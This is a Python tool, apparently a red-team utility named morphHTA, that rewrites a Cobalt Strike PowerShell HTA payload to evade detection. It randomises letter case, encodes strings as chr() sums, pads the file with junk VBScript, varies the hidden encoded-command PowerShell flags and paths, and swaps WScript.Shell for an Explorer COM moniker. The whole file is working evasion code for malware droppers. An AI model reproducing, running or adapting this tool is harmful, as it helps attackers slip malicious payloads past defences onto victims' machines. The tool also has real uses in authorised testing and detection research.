#!/usr/bin/python3
import os;
import random;
import uuid; 
import string;
import sys;
import argparse;

class morphHTA(object):
	def __init__(self):
		self.args = None

	globalDim = []
	newlines = []

	# encodedcommand morph
	ecDict = ["ec", "enc", "enco", "encod", "encode", "encoded", "encodedc", "encodedco", "encodedcom", "encodedcomm", "encodedcomma", "encodedcomman", "encodedcommand"]
	# no profile morph
	nopDict = ["nop", "nopr", "nopro", "noprof", "noprofi", "noprofil", "noprofile"]

	# window hidden morph
	winDict = ["w", "wi", "win", "wind", "windo", "window"]

	hidDict = ["1", "h", "hi", "hid", "hidd", "hidde", "hidden"]





	def junkDim(self):
		myDim = self.givemeName()
		self.globalDim += [myDim]
		return self.obfuscate("Dim " + myDim)

	def junkSet(self):
		# choose a dim'd variable to mess with
		variable = self.globalDim[random.randint(0,len(self.globalDim)-1)]
		
		value = self.obfuscateNum(self.givemeString())

		final = variable + (" = %s" % value)

		return self.obfuscate(final)


	def obfuscate( self, line ):
		base = ""
		for i in line:
			value = ""
			if self.randbool():
				# uppercase it
				value = i.upper()
			else:
				# lowercase it
				value = i.lower()
			base += value
		return base

	def obfuscateNum( self, line ):
		'''
		base = ""
		for i in line:
			value = ord(i)
			randval = random.randint(0,255)
			result = value - randval
			base += "chr(%d+%d)&" % (randval, result)
		return base[:-1]
		'''
		base = "chr("
		for i in line:
			splitnum = random.randint(1,int(self.args.maxnumsplit))
			splits = []
			target = ord(i)
			maxvaluesplit = int(float(target)/splitnum)
			for i in range(0,splitnum):
				valuesplit = random.randint(0,int(self.args.maxvalsplit))
				splits += [valuesplit]
			value = sum(splits)
			result = target - value
			for i in splits:
				base += str(i) + "+"
			base += str(result)
			base += ")&chr("
		return base[:-5]

	def randbool(self):
		return (random.random() >= 0.5)

	def givemeString(self):
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxstrlen))))
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))

		return self.obfuscate(minor + majority)

	def givemeName(self):
		majority = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(0,int(self.args.maxvarlen))))
		minor = ''.join(random.choice(string.ascii_uppercase) for _ in range(4))

		return self.obfuscate(minor + majority)

	def banner(self):
		with open('banner.txt', 'r') as f:
			data = f.read()

			print("\033[1;31m%s\033[0;0m" % data)
			print("\033[1;34mMorphing Evil.HTA from Cobalt Strike")
			print("\033[1;32mAuthor: Vincent Yiu (@vysec, @vysecurity)\033[0;0m")

	def output(self):
		print("\033[1;33m[+] Writing payload to \033[1;31m%s\033[0;0m" % self.args.out)
		f = open(self.args.out, "w+")
		self.newlines
		f.write('\n'.join(self.newlines))
		f.close()
		print("\033[1;33m[+] Payload written\033[0;0m")

	def make_argparser(self):
		parser = argparse.ArgumentParser(description = "")
		parser.add_argument("--in", metavar="<input_file>", dest = "infile", default = "evil.hta", help = "File to input Cobalt Strike PowerShell HTA")
		parser.add_argument("--out", metavar="<output_file>", dest = "out", default = "morph.hta", help = "File to output the morphed HTA to")
		parser.add_argument("--mode", metavar="<default: explorer>", dest = "mode", default = "explorer", help = "Technique to use: MSHTA, Explorer, WmiPrvSE")
		parser.add_argument("--maxstrlen", metavar="<default: 1000>", dest = "maxstrlen", default = 1000, help = "Max length of randomly generated strings")
		parser.add_argument("--maxvarlen", metavar="<default: 40>", dest = "maxvarlen", default = 40, help = "Max length of randomly generated variable names")
		parser.add_argument("--maxnumsplit", metavar="<default: 10>", dest = "maxnumsplit", default = 10, help = "Max number of times values should be split in chr obfuscation")
		parser.add_argument("--maxvalsplit", metavar="<default: 10>", dest = "maxvalsplit", default = 10, help = "Max value of each split")
		return parser

	def check_args(self, args):
		self.args = args

		if not os.path.isfile(self.args.infile):
			# not file exists
			sys.exit("\033[1;31m[*] The input file \033[1;33m%s\033[1;31m does not exist\033[0;0m" % self.args.infile)
		else:
			a = open(self.args.infile, 'r')
			bScript = False
			bPS = False
			for line in a.readlines():
				if "script language" in line.lower():
					bScript = True
				if "powershell" in line.lower():
					bPS = True

			if not (bScript and bPS):
				sys.exit("\033[1;31m[*] HTA does not include a script, invalid Cobalt Strike PowerShell HTA file\033[0;0m")

		if not (self.args.mode.lower() in ["mshta", "explorer", "wmiprvse"]):
			sys.exit("\033[1;31m[*] Invalid Mode. Select one of mshta, explorer or wmiprvse\033[0;0m")	


	def run(self, args):

		self.banner()
		print("")

		m.check_args(args)

		print("")

		print("\033[1;32m[*] morphHTA initiated\033[0;0m")

		hta = open(self.args.infile,'r')
		lines = []

		for line in hta.readlines():
			lines += [line.strip()]

		# At this point, all lines are in
		# Let's look for strings
		
		# Sanitise first
		# var_shell
		# var_Func

		# 1) grab two random variable names for our lovely HTA
		newshell = self.givemeName()
		newfunc = self.givemeName()

		#print "NewShell: %s" % newshell
		#print "NewFunc: %s" % newfunc

		temp = []

		for line in lines:
			if "var_shell.run" in line:
				if self.args.mode.lower() == "explorer":
					# Replace run command
					#print "Replacing 1"
					line = line.replace("var_shell.run", "var_shell.Document.Application.ShellExecute")
					#print line

			if "powershell.exe -nop -w hidden -encodedcommand" in line:
				if self.args.mode.lower() == "explorer":
					#print "Replacing 2"
					# Replace command and split from "powershell.exe -nop -w hidden -encodedcommand" to "powershell.exe", "-nop -w hidden -encodedcommand"
					line = line.replace("\"powershell.exe -nop -w hidden -encodedcommand", "\"powershell.exe\",\"-nop -w hidden -encodedcommand")
					line = line.replace("\", 0, true", "\",\"\",Null,0")
					#print line
					# Good

					
			if "var_shell" in line:
				# if we find var_shell
				line = line.replace("var_shell", newshell)

			if "var_func" in line:
				# if we find var_func
				line = line.replace("var_func", newfunc)

			if "CreateObject(\"Wscript.Shell\")" in line:
				# If we find WScript.Shell, we want to replace it for the Explorer moniker new:C08AFD90-F2A1-11D1-8455-00A0C91F3880 or other
				if self.args.mode.lower() == "explorer":
					# Replace the moniker, still need to replace the call object
					#print "Replacing 3"
					line = line.replace("CreateObject(\"Wscript.Shell\")", "GetObject(\"new:C08AFD90-F2A1-11D1-8455-00A0C91F3880\")")
					#print line



			temp += [line]

		lines = temp

		for line in lines:
			passed = False
			if "script language" in line:
				passed = True
			if "\"" in line and not "VBScript" in line:
				if not "powershell" in line:
					# Create Object Line -> WScript.Shell
					line0 = line.split("\"")[0]
					line1 = line.split("\"")[1]
					line2 = line.split("\"")[2]
					line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line1))) + self.obfuscate(line2)
				else:
					# keep the base64 intact
					# This is the powershell line
					# Ojkq9Lwk8HMCNXIEErlP4Gh.run "powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA", 0, true
					# We cannot morph .run
					# We cannot change powershell.exe but we can change the path and extension to nothing
					# eg. powershell.exe
					# c:\windows\system32\windowspowershell\v1.0\powershell.exe
					# c:windows\system32\windowspowershell\v1.0\powershell
					# \windows\system32\windowspowershell\v1.0\powershell

					# We can inject "" into anywhere by the powershell.exe bit

					# We can replace 0 with false

					# We can replace true with any value other than 0 or false	


					# line0 contains Ojkq9Lwk8HMCNXIEErlP4Gh.run 

					line0 = line.split("\"")[0]

					# line1 contains powershell.exe -nop -w hidden -encodedcommand JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
					# line1 can also contain just powershell.exe, do we want to add the rest back on? Let's do it
					if self.args.mode == "explorer":
						line1 = line.split("\"")[1] + "\"" + line.split("\"")[2] + "\"" + line.split("\"")[3]
					elif self.args.mode == "mshta":
						line1 = line.split("\"")[1]
				

					# This mutates the powershell.exe starting line
					psRep = ""
					if self.randbool():
						if self.randbool():
							# Use \windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "\\windows\\system32\\windowspowershell\\v1.0\\powershell"
						else:
							# Use c:\windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell"
					else:
						if self.randbool():
							# Use c:windows\system32\windowspowershell\v1.0\powershell
							# 0.25% chance
							psRep = "c:windows\\system32\\windowspowershell\\v1.0\\powershell"
						else:
							# Use powershell
							psRep = "powershell"

					if self.randbool():
						# Add .exe
						# 50% chance
						psRep = psRep + ".exe"
					

					#print psRep
					###########

					# Flip the \ with /'s randomly if there's any

					psSplit = psRep.split("\\")
					psRep = ""
					for psItem in psSplit:
						if self.randbool():
							# 50% chance
							# Set to \
							psRep += psItem + "\\"
						else:
							# 50% chance
							# Set to /
							psRep += psItem + "/"

					# Now we have too many slashes, so let's kick off the last one

					psRep = psRep[:len(psRep)-1] 
					
					###########

					line1 = line1.replace("powershell.exe", psRep)

					# This replaces the nop with others

					line1 = line1.replace("-nop", "-" + self.nopDict[random.randint(0,len(self.nopDict)-1)])

					# This replaces and morphs the w hidden
					line1 = line1.replace("-w hidden", "-" + self.winDict[random.randint(0, len(self.winDict)-1)] + " " + self.hidDict[random.randint(0, len(self.hidDict)-1)])


					# line1 can be 		var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -					encodedcommand JAB7ADKAApADsA","",Null,0
					# or line1 can be 	var_shell.run "powershell.exe -nop -w hidden -													encodedcommand JAB7AAKAApADsA", 0, true

					# line11 contains 			powershell.exe -nop -w hidden - 
					# line11 can also contain var_shell.Document.Application.ShellExecute "powershell.exe","-nop -w hidden -
					#print line1

					line11 = line1.split("encodedcommand ")[0]

					# critical contains JAB7ADEAMAAxADEAMQAApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
					critical = line1.split("encodedcommand ")[1]
					
					# line2 contains , 0, true

					if self.args.mode == "explorer":
						line2 = line.split("\"")[4] + "\"" + line.split("\"")[5] + "\"" + line.split("\"")[6]
					elif self.args.mode == "mshta":
						line2 = line.split("\"")[2]

					#print line2

					# print line0 + line11 + "encodedcommand " +  critical + line2

					# Reminder to self, I do not need to re-construct the double quotes around the command as it isn't required as our thing is a string type anyways.
					# I have added this if we are using "" obfuscation we need to use it

					# At this point we can even choose what we want to replace encodedcommand with.
					ecFill = self.ecDict[random.randint(0, len(self.ecDict)-1)]

					# line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + "encodedcommand ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)


					if self.args.mode == "explorer":
						line11 = "\"" + line11
						line2 = line2.replace(",\"\",Null,0", ",\"\",Null,0")
					#print line2
					
					#print line0 + line11 + ecFill + " " + critical + line2

					if self.args.mode == "mshta":
						line = self.obfuscate(line0) + self.obfuscate(self.obfuscateNum(self.obfuscate(line11 + ecFill + " ")) + "&") + self.obfuscateNum(critical) + self.obfuscate(line2)
					elif self.args.mode == "explorer":

						cmd = line11.split("\"")[1]

						red = (line11 + ecFill + " ")# + critical
						param = (red.split("\"")[3])

						#print "R1: %s" % (red.split("\"")[1])	# powershell bit
						#print "R3: %s" % (red.split("\"")[3])	# parameter bit
						print("Param: %s" % param)

						print(self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2))

						line = self.obfuscate(line0) + self.obfuscateNum(self.obfuscate(cmd)) + "," + (self.obfuscateNum(self.obfuscate(param) + critical)) + self.obfuscate(line2)

			else:
				line = self.obfuscate(line)
			if not passed:
				for i in range(0,random.randint(0,100)):
					self.newlines += [self.junkDim()]
					self.newlines += [self.junkSet()]
				self.newlines += [line]
			else:
				self.newlines += [line]

		#output to text file
		self.output()


if __name__ == '__main__':
	m = morphHTA()
	parser = m.make_argparser()
	arguments = parser.parse_args()
	m.run(arguments)
